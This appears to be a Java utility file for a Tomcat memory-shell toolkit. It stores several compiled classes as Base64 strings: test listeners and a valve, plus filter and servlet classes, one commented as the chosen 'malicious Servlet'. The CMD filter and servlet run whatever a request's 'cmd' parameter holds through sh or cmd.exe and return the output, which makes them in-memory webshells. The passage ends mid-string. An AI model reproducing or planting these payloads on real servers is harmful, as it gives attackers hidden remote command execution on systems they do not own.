package com.summer233;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;

public class DynamicUtils {

    public static String LISTENER_CLASS_STRING = "yv66vgAAADQAVwoAEQArCgAsAC0HAC4KABEALwgAHAoAMAAxCgAyADMKADIANAcANQoACQA2CgA3ADgIADkKADoAOwcAPAoADgA9BwA+BwA/BwBAAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACxMb3JnL3N1MTgvbWVtc2hlbGwvdGVzdC90b21jYXQvVGVzdExpc3RlbmVyOwEAEHJlcXVlc3REZXN0cm95ZWQBACYoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDspVgEAB3JlcXVlc3QBAC1Mb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdEZhY2FkZTsBAAFmAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAA3JlcQEAJ0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0OwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABNzZXJ2bGV0UmVxdWVzdEV2ZW50AQAjTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDsBAA1TdGFja01hcFRhYmxlBwA8AQAScmVxdWVzdEluaXRpYWxpemVkAQAKU291cmNlRmlsZQEAEVRlc3RMaXN0ZW5lci5qYXZhDAATABQHAEEMAEIAQwEAK29yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3RGYWNhZGUMAEQARQcARgwARwBIBwBJDABKAEsMAEwATQEAJW9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3QMAE4ATwcAUAwAUQBSAQAPCmhhY2tlZCBieSBzdTE4BwBTDABUAFUBABNqYXZhL2xhbmcvRXhjZXB0aW9uDABWABQBACpvcmcvc3UxOC9tZW1zaGVsbC90ZXN0L3RvbWNhdC9UZXN0TGlzdGVuZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAkamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdExpc3RlbmVyAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQARZ2V0U2VydmxldFJlcXVlc3QBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAD2phdmEvbGFuZy9DbGFzcwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAtnZXRSZXNwb25zZQEAKigpTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwEAJm9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAD3ByaW50U3RhY2tUcmFjZQAhABAAEQABABIAAAADAAEAEwAUAAEAFQAAAC8AAQABAAAABSq3AAGxAAAAAgAWAAAABgABAAAADQAXAAAADAABAAAABQAYABkAAAABABoAGwABABUAAADIAAIABQAAADcrtgACwAADTSy2AAQSBbYABk4tBLYABy0stgAIwAAJOgQZBLYACrYACxIMtgANpwAITSy2AA+xAAEAAAAuADEADgADABYAAAAmAAkAAAAXAAgAGAASABkAFwAaACEAHAAuACAAMQAeADIAHwA2ACMAFwAAAD4ABgAIACYAHAAdAAIAEgAcAB4AHwADACEADQAgACEABAAyAAQAIgAjAAIAAAA3ABgAGQAAAAAANwAkACUAAQAmAAAABwACcQcAJwQAAQAoABsAAQAVAAAANQAAAAIAAAABsQAAAAIAFgAAAAYAAQAAACwAFwAAABYAAgAAAAEAGAAZAAAAAAABACQAJQABAAEAKQAAAAIAKg==";

    public static String VALVE_CLASS_STRING = "yv66vgAAADQAMQoACAAbCgAcAB0IAB4KAB8AIAoABwAhCwAiACMHACQHACUBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAKUxvcmcvc3UxOC9tZW1zaGVsbC90ZXN0L3RvbWNhdC9UZXN0VmFsdmU7AQAGaW52b2tlAQBSKExvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0O0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZTspVgEAB3JlcXVlc3QBACdMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdDsBAAhyZXNwb25zZQEAKExvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZTsBAApFeGNlcHRpb25zBwAmBwAnAQAKU291cmNlRmlsZQEADlRlc3RWYWx2ZS5qYXZhDAAJAAoHACgMACkAKgEAEkkgY29tZSBoZXJlIGZpcnN0IQcAKwwALAAtDAAuAC8HADAMABAAEQEAJ29yZy9zdTE4L21lbXNoZWxsL3Rlc3QvdG9tY2F0L1Rlc3RWYWx2ZQEAJG9yZy9hcGFjaGUvY2F0YWxpbmEvdmFsdmVzL1ZhbHZlQmFzZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BACZvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAdnZXROZXh0AQAdKClMb3JnL2FwYWNoZS9jYXRhbGluYS9WYWx2ZTsBABlvcmcvYXBhY2hlL2NhdGFsaW5hL1ZhbHZlACEABwAIAAAAAAACAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAADQANAAAADAABAAAABQAOAA8AAAABABAAEQACAAsAAABbAAMAAwAAABUstgACEgO2AAQqtgAFKyy5AAYDALEAAAACAAwAAAAOAAMAAAARAAkAEwAUABQADQAAACAAAwAAABUADgAPAAAAAAAVABIAEwABAAAAFQAUABUAAgAWAAAABgACABcAGAABABkAAAACABo=";

    public static String BASIC_FILTER_CLASS_STRING_BASE64 = "yv66vgAAAEEANwoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCwAIAAkHAAoMAAsADAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsIAA4BABB0aGlzIGlzIGEgZmlsdGVyCgAQABEHABIMABMAFAEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWCwAWABcHABgMABkAGgEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BAAhkb0ZpbHRlcgEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYHABwBABljb20vc3VtbWVyMjMzL0Jhc2ljRmlsdGVyBwAeAQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAG0xjb20vc3VtbWVyMjMzL0Jhc2ljRmlsdGVyOwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEACkV4Y2VwdGlvbnMHADEBABNqYXZhL2lvL0lPRXhjZXB0aW9uBwAzAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABBCYXNpY0ZpbHRlci5qYXZhACEAGwACAAEAHQAAAAQAAQAFAAYAAQAfAAAAMwABAAEAAAAFKrcAAbEAAAACACAAAAAKAAIAAAAMAAQADQAhAAAADAABAAAABQAiACMAAAABACQAJQABAB8AAAA1AAAAAgAAAAGxAAAAAgAgAAAABgABAAAAEQAhAAAAFgACAAAAAQAiACMAAAAAAAEAJgAnAAEAAQAZACgAAgAfAAAAZAADAAQAAAAULLkABwEAEg22AA8tKyy5ABUDALEAAAACACAAAAAOAAMAAAAWAAsAFwATABgAIQAAACoABAAAABQAIgAjAAAAAAAUACkAKgABAAAAFAArACwAAgAAABQALQAuAAMALwAAAAYAAgAwADIAAQA0AAYAAQAfAAAAKwAAAAEAAAABsQAAAAIAIAAAAAYAAQAAABwAIQAAAAwAAQAAAAEAIgAjAAAAAQA1AAAAAgA2";
    public static String BASIC_SEVLET_CLASS_STRING_BASE64 = "yv66vgAAAEEANAoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCwAIAAkHAAoMAAsADAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsIAA4BABV0aGlzIGlzIGEgbmV3IFNlcnZsZXQKABAAEQcAEgwAEwAUAQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYHABYBACBjb20vc3VtbWVyMjMzL1N1bW1lckJhc2ljU2VydmxldAcAGAEAFWphdmF4L3NlcnZsZXQvU2VydmxldAEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAiTGNvbS9zdW1tZXIyMzMvU3VtbWVyQmFzaWNTZXJ2bGV0OwEABGluaXQBACAoTGphdmF4L3NlcnZsZXQvU2VydmxldENvbmZpZzspVgEADXNlcnZsZXRDb25maWcBAB1MamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEACkV4Y2VwdGlvbnMHACQBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABBnZXRTZXJ2bGV0Q29uZmlnAQAfKClMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEAB3NlcnZpY2UBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7BwAuAQATamF2YS9pby9JT0V4Y2VwdGlvbgEADmdldFNlcnZsZXRJbmZvAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAdkZXN0cm95AQAKU291cmNlRmlsZQEAF1N1bW1lckJhc2ljU2VydmxldC5qYXZhACEAFQACAAEAFwAAAAYAAQAFAAYAAQAZAAAAMwABAAEAAAAFKrcAAbEAAAACABoAAAAKAAIAAAALAAQADAAbAAAADAABAAAABQAcAB0AAAABAB4AHwACABkAAAA1AAAAAgAAAAGxAAAAAgAaAAAABgABAAAAEAAbAAAAFgACAAAAAQAcAB0AAAAAAAEAIAAhAAEAIgAAAAQAAQAjAAEAJQAmAAEAGQAAACwAAQABAAAAAgGwAAAAAgAaAAAABgABAAAAFAAbAAAADAABAAAAAgAcAB0AAAABACcAKAACABkAAABOAAIAAwAAAAwsuQAHAQASDbYAD7EAAAACABoAAAAKAAIAAAAZAAsAHAAbAAAAIAADAAAADAAcAB0AAAAAAAwAKQAqAAEAAAAMACsALAACACIAAAAGAAIAIwAtAAEALwAwAAEAGQAAACwAAQABAAAAAgGwAAAAAgAaAAAABgABAAAAIAAbAAAADAABAAAAAgAcAB0AAAABADEABgABABkAAAArAAAAAQAAAAGxAAAAAgAaAAAABgABAAAAJQAbAAAADAABAAAAAQAcAB0AAAABADIAAAACADM=";
    public static String BASIC_LISTENER_CLASS_STRING_BASE64 = "yv66vgAAAEEAVgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAIWphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudAEAEWdldFNlcnZsZXRSZXF1ZXN0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsHAA4BACtvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0RmFjYWRlCgACABAMABEAEgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwgAFAEAB3JlcXVlc3QKABYAFwcAGAwAGQAaAQAPamF2YS9sYW5nL0NsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwoAHAAdBwAeDAAfACABABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWCgAcACIMACMAJAEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7BwAmAQAlb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdAoAJQAoDAApACoBAAtnZXRSZXNwb25zZQEAKigpTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwoALAAtBwAuDAAvADABACZvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7CAAyAQAoCkJhc2ljTGlzdGVuZXIgcmVxdWVzdERlc3Ryb3llZCBJbmplY3RlZAoANAA1BwA2DAA3ADgBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgcAOgEAE2phdmEvbGFuZy9FeGNlcHRpb24KADkAPAwAPQAGAQAPcHJpbnRTdGFja1RyYWNlBwA/AQAbY29tL3N1bW1lcjIzMy9CYXNpY0xpc3RlbmVyBwBBAQAkamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdExpc3RlbmVyAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB1MY29tL3N1bW1lcjIzMy9CYXNpY0xpc3RlbmVyOwEAEHJlcXVlc3REZXN0cm95ZWQBACYoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDspVgEALUxvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0RmFjYWRlOwEAAWYBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQADcmVxAQAnTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3Q7AQAEdmFyNQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAE3NlcnZsZXRSZXF1ZXN0RXZlbnQBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEADVN0YWNrTWFwVGFibGUBABJyZXF1ZXN0SW5pdGlhbGl6ZWQBAApTb3VyY2VGaWxlAQASQmFzaWNMaXN0ZW5lci5qYXZhACEAPgACAAEAQAAAAAMAAQAFAAYAAQBCAAAAMwABAAEAAAAFKrcAAbEAAAACAEMAAAAKAAIAAAAKAAQACwBEAAAADAABAAAABQBFAEYAAAABAEcASAABAEIAAADIAAIABQAAADcrtgAHwAANTSy2AA8SE7YAFU4tBLYAGy0stgAhwAAlOgQZBLYAJ7YAKxIxtgAzpwAITSy2ADuxAAEAAAAuADEAOQADAEMAAAAmAAkAAAAPAAgAEAASABEAFwASACEAEwAuABYAMQAUADIAFQA2ABgARAAAAD4ABgAIACYAFABJAAIAEgAcAEoASwADACEADQBMAE0ABAAyAAQATgBPAAIAAAA3AEUARgAAAAAANwBQAFEAAQBSAAAABwACcQcAOQQAAQBTAEgAAQBCAAAANQAAAAIAAAABsQAAAAIAQwAAAAYAAQAAABsARAAAABYAAgAAAAEARQBGAAAAAAABAFAAUQABAAEAVAAAAAIAVQ==";
    
    public static String CMD_FILTER_CLASS_STRING_BASE64 = "yv66vgAAAEEAoQoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAYdGV4dC9odG1sOyBjaGFyc2V0PVVURi04CwAKAAsHAAwMAA0ADgEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAOc2V0Q29udGVudFR5cGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYIABABAAVVVEYtOAsACgASDAATAA4BABRzZXRDaGFyYWN0ZXJFbmNvZGluZwsACgAVDAAWABcBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwgAGQEAEHRoaXMgaXMgYSBmaWx0ZXIKABsAHAcAHQwAHgAOAQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4HACABACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0CAAiAQADY21kCwAfACQMACUAJgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7CAAoAQAHb3MubmFtZQoAKgArBwAsDAAtACYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkKAC8AMAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsIADUBAAN3aW4KAC8ANwwAOAA5AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoIADsBAAJzaAgAPQEAAi1jCAA/AQAHY21kLmV4ZQgAQQEAAi9jCgBDAEQHAEUMAEYARwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwoAQwBJDABKAEsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwoATQBOBwBPDABQAFEBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsHAFMBABFqYXZhL3V0aWwvU2Nhbm5lcgoAUgBVDAAFAFYBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYIAFgBAAJcYQoAUgBaDABbAFwBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsKAFIAXgwAXwBgAQAHaGFzTmV4dAEAAygpWgoAUgBiDABjADMBAARuZXh0CABlAQAACgAbAGcMAGgADgEABXdyaXRlCgAbAGoMAGsABgEABWZsdXNoCwBtAG4HAG8MAHAAcQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BAAhkb0ZpbHRlcgEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYHAHMBABdjb20vc3VtbWVyMjMzL0NNREZpbHRlcgcAdQEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABlMY29tL3N1bW1lcjIzMy9DTURGaWx0ZXI7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEAB2lzTGludXgBAAFaAQAFb3NUeXABABJMamF2YS9sYW5nL1N0cmluZzsBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQABcwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAZvdXRwdXQBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEADVN0YWNrTWFwVGFibGUHAIUHAJYBABNqYXZhL2lvL0lucHV0U3RyZWFtBwCYAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEACkV4Y2VwdGlvbnMHAJsBABNqYXZhL2lvL0lPRXhjZXB0aW9uBwCdAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBAA5DTURGaWx0ZXIuamF2YQAhAHIAAgABAHQAAAAEAAEABQAGAAEAdgAAADMAAQABAAAABSq3AAGxAAAAAgB3AAAACgACAAAAEAAEABEAeAAAAAwAAQAAAAUAeQB6AAAAAQB7AHwAAQB2AAAANQAAAAIAAAABsQAAAAIAdwAAAAYAAQAAABUAeAAAABYAAgAAAAEAeQB6AAAAAAABAH0AfgABAAEAcAB/AAIAdgAAAewABQALAAAA2SwSB7kACQIALBIPuQARAgAsuQAUAQASGLYAGivAAB86BBkEEiG5ACMCAMYApgQ2BRInuAApOgYZBsYAExkGtgAuEjS2ADaZAAYDNgUVBZkAIAa9AC9ZAxI6U1kEEjxTWQUZBBIhuQAjAgBTpwAdBr0AL1kDEj5TWQQSQFNZBRkEEiG5ACMCAFM6B7gAQhkHtgBItgBMOgi7AFJZGQi3AFQSV7YAWToJGQm2AF2ZAAsZCbYAYacABRJkOgosuQAUAQAZCrYAZiy5ABQBALYAabEtKyy5AGwDALEAAAADAHcAAABOABMAAAAaAAgAGwAQABwAGwAdACEAHgAtAB8AMAAgADcAIQBJACIATAAkAG4AJQCKACYAlwAnAKcAKAC7ACkAxgAqAM8AKwDQAC0A2AAuAHgAAABwAAsAMACgAIAAgQAFADcAmQCCAIMABgCKAEYAhACFAAcAlwA5AIYAhwAIAKcAKQCIAIkACQC7ABUAigCDAAoAAADZAHkAegAAAAAA2QCLAIwAAQAAANkAjQCOAAIAAADZAI8AkAADACEAuACRAJIABACTAAAANwAG/gBMBwAfAQcALyFZBwCU/gAuBwCUBwCVBwBSQQcAL/8AFgAFBwByBwCXBwAKBwBtBwAfAAAAmQAAAAYAAgCaAJwAAQCeAAYAAQB2AAAAKwAAAAEAAAABsQAAAAIAdwAAAAYAAQAAADIAeAAAAAwAAQAAAAEAeQB6AAAAAQCfAAAAAgCg";
    // version 1.1 - 最终敲定合适的恶意Servlet
    public static String SUMMER_CMD_SERVLET_CLASS_STRING_BASE64 = "yv66vgAAAEEApQoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAYdGV4dC9odG1sOyBjaGFyc2V0PVVURi04CwAKAAsHAAwMAA0ADgEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAOc2V0Q29udGVudFR5cGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYIABABAAVVVEYtOAsACgASDAATAA4BABRzZXRDaGFyYWN0ZXJFbmNvZGluZwsACgAVDAAWABcBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwgAGQEAHnRoaXMgaXMgYSBTdW1tZXJDTURTZXJ2bGV0PGJyPgoAGwAcBwAdDAAeAA4BABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgcAIAEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QIACIBAANjbWQLAB8AJAwAJQAmAQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsIACgBAAdvcy5uYW1lCgAqACsHACwMAC0AJgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQoALwAwBwAxDAAyADMBABBqYXZhL2xhbmcvU3RyaW5nAQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwgANQEAA3dpbgoALwA3DAA4ADkBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWggAOwEAAnNoCAA9AQACLWMIAD8BAAdjbWQuZXhlCABBAQACL2MKAEMARAcARQwARgBHAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7CgBDAEkMAEoASwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7CgBNAE4HAE8MAFAAUQEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwcAUwEAEWphdmEvdXRpbC9TY2FubmVyCgBSAFUMAAUAVgEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVggAWAEAAlxhCgBSAFoMAFsAXAEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwoAUgBeDABfAGABAAdoYXNOZXh0AQADKClaCgBSAGIMAGMAMwEABG5leHQIAGUBAAAKABsAZwwAaAAGAQAFZmx1c2gKABsAagwAawAGAQAFY2xvc2UHAG0BABNqYXZhL2xhbmcvVGhyb3dhYmxlCgBsAG8MAHAAcQEADWFkZFN1cHByZXNzZWQBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYHAHMBAB5jb20vc3VtbWVyMjMzL1N1bW1lckNNRFNlcnZsZXQHAHUBABVqYXZheC9zZXJ2bGV0L1NlcnZsZXQBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAIExjb20vc3VtbWVyMjMzL1N1bW1lckNNRFNlcnZsZXQ7AQAEaW5pdAEAIChMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOylWAQANc2VydmxldENvbmZpZwEAHUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAKRXhjZXB0aW9ucwcAgQEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAEGdldFNlcnZsZXRDb25maWcBAB8oKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAHc2VydmljZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBAA5yZXNwb25zZVdyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAB2lzTGludXgBAAFaAQAFb3NUeXABABJMamF2YS9sYW5nL1N0cmluZzsBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQABcwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAZvdXRwdXQBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bG